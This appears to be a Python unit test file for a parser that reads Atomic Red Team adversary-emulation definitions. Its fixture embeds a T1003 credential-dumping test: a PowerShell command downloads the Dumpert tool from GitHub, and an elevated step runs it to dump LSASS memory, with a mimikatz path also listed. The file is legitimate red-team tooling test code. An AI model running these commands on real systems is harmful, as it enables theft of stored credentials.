from red_raccoon.integrations.atomic_red_team.types import TestSuite, TestCase, Dependency, InputArgument

import red_raccoon.integrations.atomic_red_team.parsers as parsers
import unittest

TECHNIQUE_ID = 'T1003'
TECHNIQUE_NAME = 'Credential Dumping'

TEST_CASE = {
    "auto_generated_guid": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
    "dependencies": [
        {
            "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
            "get_prereq_command": "New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null\n"
                                  "Invoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/"
                                  "5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" "
                                  "-OutFile #{dumpert_exe}\n",
            "prereq_command": "if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}\n"
        }
    ],
    "dependency_executor_name": "powershell",
    "description": "...",
    "executor": {
        "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n",
        "command": "#{dumpert_exe}\n",
        "elevation_required": True,
        "name": "command_prompt"
    },
    "input_arguments": {
        "dumpert_exe": {
            "default": "PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe",
            "description": "Path of Dumpert executable",
            "type": "Path"
        }
    },
    "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
    "supported_platforms": [
        "windows"
    ]
}

TEST_SUITE = {
    'atomic_tests': [TEST_CASE],
    'display_name': TECHNIQUE_NAME,
    'attack_technique': TECHNIQUE_ID,
}


class ParserTestCases(unittest.TestCase):
    def test_parse_test_suite(self):
        test_suite = parsers.parse_test_suite(data=TEST_SUITE)
        self.assertIsInstance(test_suite, TestSuite)

    def test_parse_test_case(self):
        test_case = parsers.parse_test_case(data=TEST_CASE, technique_id=TECHNIQUE_ID, technique_name=TECHNIQUE_NAME)
        self.assertIsInstance(test_case, TestCase)

    def test_parse_dependencies(self):
        dependencies = parsers.parse_dependencies(TEST_CASE['dependencies'])
        self.assertIsInstance(dependencies, list)
        self.assertGreater(len(dependencies), 0)
        for dependency in dependencies:
            self.assertIsInstance(dependency, Dependency)

    def test_parse_input_arguments(self):
        input_arguments = parsers.parse_input_arguments(TEST_CASE['input_arguments'])
        self.assertIsInstance(input_arguments, list)
        self.assertGreater(len(input_arguments), 0)
        for input_argument in input_arguments:
            self.assertIsInstance(input_argument, InputArgument)

    def test_get_test_case_id(self):
        expected = '9833719bb2a74003849bff29fc4ffea15a1d1ba0d3ef01f2d9cd568e3df9b889bd6291c0a8fe2abf06a84d243173c46fe' \
                   '3cd40f9cf847e5bdd11495081d2421d'

        result = parsers.get_test_case_id(
            technique_id=TECHNIQUE_ID,
            technique_name=TECHNIQUE_NAME,
            command_template=TEST_CASE['executor']['command'],
            cleanup_command_template=TEST_CASE['executor']['cleanup_command'],
        )
        self.assertEqual(expected, result)

    def test_normalize_path_to_atomics_folder_with_absolute_posix_path(self):
        atomic_red_team_directory = '/tmp/atomic-red-team'

        for path, expected in [
            ['/tmp/atomic-red-team/atomics', '/tmp/atomic-red-team/atomics'],
            ['/tmp/AtomicRedTeam/atomics/T1222', '/tmp/atomic-red-team/atomics/T1222'],
            ['PathToAtomicsFolder/T1502/bin/calc.dll', '/tmp/atomic-red-team/atomics/T1502/bin/calc.dll'],
            ['PathToAtomicsFolder\\T1003\\src\\test.ps1', '/tmp/atomic-red-team/atomics/T1003/src/test.ps1'],
            ['PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe', '/tmp/atomic-red-team/atomics/T1003/bin/mimikatz.exe'],
            ['C:/Windows/Temp/atomicNotificationPackage.dll', 'C:/Windows/Temp/atomicNotificationPackage.dll'],
        ]:
            with self.subTest(path):
                result = parsers.normalize_path_to_atomics_folder(
                    path=path,
                    atomic_red_team_directory=atomic_red_team_directory,
                )
                self.assertEqual(expected, result)
